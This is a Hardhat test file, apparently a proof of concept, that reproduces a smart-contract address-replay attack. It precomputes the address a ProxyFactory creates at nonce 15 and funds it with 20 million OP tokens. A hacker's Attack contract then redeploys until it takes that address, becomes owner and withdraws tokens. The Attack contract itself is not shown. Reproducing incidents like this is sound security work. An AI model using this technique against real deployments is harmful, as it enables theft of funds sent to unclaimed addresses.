const hardhat = require('hardhat');
const { ethers } = hardhat;
const { expect } = require('chai');
const rlp = require('rlp');
const keccak = require('keccak');

describe('Exploit', async () => {
  let deployer, hacker;
  let proxyFactory, targetAddress, opToken;
  let nonce = 15;

  beforeEach(async () => {
    [deployer, hacker] = await ethers.getSigners();

    let ProxyFactory = await ethers.getContractFactory('ProxyFactory');
    proxyFactory = await ProxyFactory.connect(deployer).deploy();
    console.log('\n Before attack');
    console.log('Proxy Factory address: ' + proxyFactory.address.toLowerCase());

    // assuming target address corresponds to nonce = 15
    var input_arr = [proxyFactory.address, parseInt(nonce.toString(16), 16)];
    var rlp_encoded = rlp.encode(input_arr);
    var contract_address_long = keccak('keccak256').update(Buffer.from(rlp_encoded)).digest('hex');
    targetAddress = '0x' + contract_address_long.substring(24);
    console.log('Target address: ' + targetAddress);

    // Deploy transfer 20M OP to target address
    let OPToken = await ethers.getContractFactory('GovernanceToken');
    opToken = await OPToken.connect(deployer).deploy();
    await opToken.connect(deployer).mint(targetAddress, '20000000000000000000000000');
    console.log("Target's OP balance: " + parseInt(await opToken.balanceOf(targetAddress)));
  });

  it('Check', async () => {
    let Attack = await ethers.getContractFactory('Attack');

    let attack = await Attack.connect(hacker).deploy(
      proxyFactory.address,
      targetAddress,
      opToken.address
    );

    await attack.connect(hacker).replayDeploy();
    expect(await attack.found()).to.be.equal(true);

    attack = await ethers.getContractAt('Attack', targetAddress);
    expect(await attack.owner()).to.be.equal(hacker.address);

    // hacker withdraw 1,000,000 OP token
    await attack.connect(hacker).withdrawToken(hacker.address, '1000000000000000000000000');
    console.log('\n After attack');
    console.log("Hacker's OP balance: " + parseInt(await opToken.balanceOf(hacker.address)));
    console.log("Target's OP balance: " + parseInt(await opToken.balanceOf(targetAddress)));
  });
});
